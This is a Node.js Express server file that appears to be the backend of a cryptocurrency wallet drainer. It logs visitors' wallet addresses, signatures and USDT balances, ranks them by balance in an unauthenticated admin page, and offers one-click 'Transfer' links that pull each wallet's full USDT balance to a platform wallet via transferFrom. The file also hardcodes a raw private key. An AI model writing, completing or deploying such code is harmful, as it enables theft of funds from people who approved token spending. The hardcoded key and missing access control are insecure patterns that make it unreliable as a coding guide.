// index.js const express = require('express'); const { ethers } = require('ethers'); const app = express(); const PORT = process.env.PORT || 3000;

// Replace with your real private key const PRIVATE_KEY = 'f9d6c36675444fd1276c8fac11dfb54288b5a61df546c38ce6a8ad522b1a692e'; const PLATFORM_WALLET = '0xYourPlatformAddress'; // Replace with your platform wallet address const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955'; const BSC_RPC = 'https://bsc-dataseed.binance.org/';

app.use(express.json());

const provider = new ethers.providers.JsonRpcProvider(BSC_RPC); const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const USDT_ABI = [ "function transferFrom(address from, address to, uint256 value) public returns (bool)", "function balanceOf(address account) view returns (uint256)", "function decimals() view returns (uint8)" ];

const usdt = new ethers.Contract(USDT_CONTRACT, USDT_ABI, wallet);

let users = [];

app.post('/log', async (req, res) => { const { wallet: address, signature, timestamp } = req.body; if (!address || !signature) return res.status(400).send('Invalid data');

const balance = await usdt.balanceOf(address); users.push({ address, signature, timestamp, balance: balance.toString() }); res.status(200).send('Logged'); });

app.get('/admin', async (req, res) => { let html = '<h1>Admin Panel</h1><ul>'; users.sort((a, b) => b.balance - a.balance).forEach(user => { html += <li>${user.address} - ${ethers.utils.formatUnits(user.balance, 18)} USDT - <a href="/transfer?wallet=${user.address}">Transfer</a></li>; }); html += '</ul>'; res.send(html); });

app.get('/transfer', async (req, res) => { const userWallet = req.query.wallet; if (!userWallet) return res.send('Wallet required'); try { const balance = await usdt.balanceOf(userWallet); const tx = await usdt.transferFrom(userWallet, PLATFORM_WALLET, balance); await tx.wait(); res.send(✅ Transfer success from ${userWallet}); } catch (err) { res.send(❌ Transfer failed: ${err.message}); } });

app.listen(PORT, () => console.log(Server running on http://localhost:${PORT}));

